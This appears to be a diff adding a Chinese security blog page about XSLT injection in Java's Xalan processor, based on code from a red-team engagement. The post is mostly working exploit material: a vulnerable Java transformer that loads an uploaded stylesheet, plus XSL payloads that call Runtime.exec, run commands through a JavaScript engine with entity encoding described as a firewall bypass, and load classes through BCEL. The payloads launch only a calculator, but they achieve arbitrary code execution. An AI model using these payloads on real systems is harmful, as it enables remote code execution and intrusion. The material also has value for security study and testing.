@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html>
+        <head>
+        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
+        <meta charset="utf-8">
+        <title>java中的xslt实现(xalan) | 侠客行|</title>
+        <link rel="stylesheet" href="https://ICheeryI.github.io/styles/main.css">
+        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
+        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
+         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+         <script >hljs.initHighlightingOnLoad();</script>
+
+    </head>
+    <body>
+              <header class="header mdui-m-b-5">      
+            <div class="container  ">
+                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://ICheeryI.github.io">侠客行|</a></div>
+                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s">学如逆水行舟</div>
+           
+            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
+                   
+                            <li><a href="/">首页</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/archives">归档</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/tags">标签</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/Cheery">关于我</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                  </nav>
+                </div>
+        </header>
+        <div class="mdui-container ">
+                <div class="mdui-row">
+                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
+                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
+                                    <div class="post-title  mdui-m-b-1">java中的xslt实现(xalan)</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2020-11-17 23:21:37">2020-11-17 / 6 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="前言"><strong>前言</strong></h1>
+<blockquote>
+<ol>
+<li>xslt(Extensible Stylesheet Language Transformations),目的是用来做样式转换。<a href="https://www.w3school.com.cn/xsl/index.asp">xslt简介</a>  <a href="https://www.w3.org/TR/xslt/">xslt协议</a></li>
+<li>本文主要讨论在java代码的使用xsl时，引发的安全问题</li>
+<li>本文测试的java代码如下:</li>
+</ol>
+</blockquote>
+<pre><code class="language-java">package ysoserial.payloads.test;
+
+import java.io.*;
+import java.lang.*;
+import javax.xml.transform.Transformer;
+import javax.xml.transform.TransformerFactory;
+import javax.xml.transform.stream.StreamResult;
+import javax.xml.transform.stream.StreamSource;
+public class xsl_demo {
+   public static void main(String[] args) throws Exception
+   {
+       try{
+           TransformerFactory tFactory = TransformerFactory.newInstance();
+           Transformer tformer = tFactory.newTransformer(new StreamSource(&quot;F:\\xsl\\123.xml&quot;));
+           StringReader xmlR = new StringReader(&quot;&lt;abc&gt;&lt;/abc&gt;&quot;);
+           StringWriter outW = new StringWriter();
+           tformer.transform(new StreamSource(xmlR), new StreamResult(outW));
+           xmlR.close();
+           outW.close();
+           System.out.println(outW.toString());
+       }catch(Exception ex){
+           ex.printStackTrace();
+       }
+   }
+}
+</code></pre>
+<h2 id="代码分析"><strong>代码分析</strong></h2>
+<blockquote>
+<ol>
+<li>该代码来源于HW中的一个系统的代码简化，其中path:(F:\xsl\123.xml&quot;) 可控，其中path文件内容通过文件上传得到，这里代码中StreamSource() 获取到XML流，所以不必关心path文件的后缀</li>
+<li>代码的本身功能是用来用作xml的格式转换和输出</li>
+<li>该代码造成了任意代码执行</li>
+</ol>
+</blockquote>
+<h2 id="xalan"><strong>Xalan</strong></h2>
+<h4 id="1-xslt的简单探测"><em><strong>1. xslt的简单探测</strong></em></h4>
+<p>我们控制path内容，可以得到xslt解释器的基本信息</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; version=&quot;2.0&quot;&gt;
+&lt;xsl:output version=&quot;1.0&quot; indent=&quot;yes&quot; encoding=&quot;iso-8859-1&quot; method=&quot;xml&quot;/&gt;
+&lt;xsl:template match=&quot;/&quot;&gt;
+&lt;html&gt;
+ &lt;body&gt;
+ Version: &lt;xsl:value-of select=&quot;system-property('xsl:version')&quot; /&gt;&lt;br /&gt;
+ Vendor: &lt;xsl:value-of select=&quot;system-property('xsl:vendor')&quot; /&gt;&lt;br /&gt;
+ Vendor URL: &lt;xsl:value-of select=&quot;system-property('xsl:vendor-url')&quot; /&gt;&lt;br /&gt;
+&lt;/body&gt;
+&lt;/html&gt;&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ICheeryI.github.io/post-images/1605628136434.PNG" alt="" loading="lazy"></figure>
+<h4 id="2-xalan基础"><em><strong>2. Xalan基础</strong></em></h4>
+<blockquote>
+<p>xalan-java是一套xslt处理器,用来将XML文件转换为HTML,TEXT和XML等其他类型文件格式<br>
+xalan 其他的不用关心，直接关注他对xslt的扩展实现 <a href="https://xml.apache.org/xalan-j/extensions.html">文档</a></p>
+</blockquote>
+<h4 id="使用符合xalan的xslt扩展"><em><strong>使用符合xalan的xslt扩展</strong></em></h4>
+<ol>
+<li>调用静态java方法</li>
+</ol>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;xsl:stylesheet 
+  xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; 
+  version=&quot;1.0&quot;   
+  xmlns:java=&quot;http://xml.apache.org/xalan/java&quot;&gt;
+
+&lt;xsl:template match=&quot;/&quot;&gt; 
+  &lt;xsl:variable name=&quot;date&quot; select=&quot;java:java.lang.Thread.sleep(20000)&quot;/&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;  
+</code></pre>
+<ol start="2">
+<li>调用非静态java方法</li>
+</ol>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;xsl:stylesheet 
+    xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; 
+    version=&quot;1.0&quot;   
+    xmlns:java=&quot;http://xml.apache.org/xalan/java&quot;&gt;
+  
+  &lt;xsl:template match=&quot;/&quot;&gt; 
+    &lt;xsl:variable name=&quot;date&quot; select=&quot;java:java.lang.Runtime.getRuntime()&quot;/&gt;
+    &lt;p&gt;Date: &lt;xsl:value-of select=&quot;java:exec($date,'calc')&quot;/&gt;&lt;/p&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre>
+<p><img src="https://ICheeryI.github.io/post-images/1605632246859.PNG" alt="" loading="lazy"><br>
+3. 利用 javax.script.ScriptEngine 执行Java代码，内容可以使用unicode编码来绕过waf <a href="http://tool.chinaz.com/tools/unicode.aspx">在线地址</a> ASCII-&gt;unicode</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;xsl:stylesheet 
+    xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; 
+    version=&quot;1.0&quot;
+    xmlns:m=&quot;javax.script.ScriptEngineManager&quot;
+    xmlns:e=&quot;javax.script.ScriptEngine&quot;
+    xmlns:java=&quot;http://xml.apache.org/xalan/java&quot;&gt;
+
+&lt;xsl:output version=&quot;1.0&quot; indent=&quot;yes&quot; encoding=&quot;iso-8859-1&quot; method=&quot;xml&quot;/&gt;
+&lt;xsl:template match=&quot;/&quot;&gt;
+&lt;xsl:value-of select=&quot;.&quot; /&gt;
+&lt;xsl:variable name=&quot;engine&quot; select=&quot;m:getEngineByName(m:new(),'js')&quot;/&gt;
+&lt;xsl:variable name=&quot;runtime&quot; select=&quot;java:java.lang.Runtime.getRuntime()&quot;/&gt;
+&lt;xsl:value-of select=&quot;e:put($engine,'script_exec',$runtime)&quot;/&gt;
+&lt;xsl:value-of select=&quot;e:eval($engine,'&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#95;&amp;#101;&amp;#120;&amp;#101;&amp;#99;&amp;#46;&amp;#101;&amp;#120;&amp;#101;&amp;#99;&amp;#40;&amp;#34;&amp;#99;&amp;#97;&amp;#108;&amp;#99;&amp;#34;&amp;#41;&amp;#59;')&quot;/&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre>
+<ol start="4">
+<li>利用bcel执行代码</li>
+</ol>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; version=&quot;2.0&quot;&gt;
+&lt;xsl:output method=&quot;xml&quot; version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot; indent=&quot;yes&quot;/&gt;
+&lt;xsl:template match=&quot;/&quot;&gt;
+&lt;x&gt;
+&lt;xsl:value-of select=&quot;.&quot;/&gt;
+&lt;xsl:value-of xmlns:cls=&quot;java.lang.Class&quot; xmlns:ld=&quot;org.apache.bcel.util.ClassLoader&quot; select=&quot;cls:newInstance(ld:loadClass(ld:new(cls:getClassLoader(ld:getClass(ld:new()))),'$$BCEL$$'))&quot;/&gt;
+&lt;/x&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre>
+<h2 id="todo">ToDo</h2>
+<blockquote>
+<p>以后遇见了其他语言的场景再次记录<br>
+<img src="https://ICheeryI.github.io/post-images/1605635519575.PNG" alt="" loading="lazy"></p>
+</blockquote>
+</div>
+                                    <div class="mdui-divider mdui-m-b-2"></div>
+                                    <div class="mdui-row-xs-2 post-fenye">
+                                       
+                                        <div class="mdui-col"> </div>
+                                        
+
+                                        
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://ICheeryI.github.io/Discuz_Key/">Discuz Key的利用脚本</a></div> </div>
+                                       
+                                      </div>
+                                   
+                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
+                                    
+                                     <script src="https://ICheeryI.github.io/media/scripts/Valine.min.js"></script>
+ <div class="comment"></div>
+
+<script>
+      new Valine({
+            el: '.comment',
+
+
+
+            path: window.location.pathname,
+            pageSize: 30,
+            avatar:'mm', 
+       })
+    </script> 
+<script>
+    if(window.location.hash){
+        var checkExist = setInterval(function() {
+           if ($(window.location.hash).length) {
+              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
+              clearInterval(checkExist);
+           }
+        }, 100);
+    }
+</script>
+                                </article>
+
+                                    
+                        </div>
+                      </div>
+    
+                
+
+              </div>
+                    <footer class="footer mdui-m-t-5 mdui-text-center">
+               <nav class="social-links">
+                      <ul>
+                      
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      </ul>
+                    </nav>
+                    <div class="copyright">
+                      <p>Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> <br/> Theme <a href="https://github.com/shanbufun/gridea-theme-song" target="_blank"  title="宋"  >Song</a> by <a href="https://shanbu.fun/" target="_blank"  title="山卜方" >shanbufun</a> </p>
+                  </div>
+                  
+              </footer>
+    </body>
+</html>
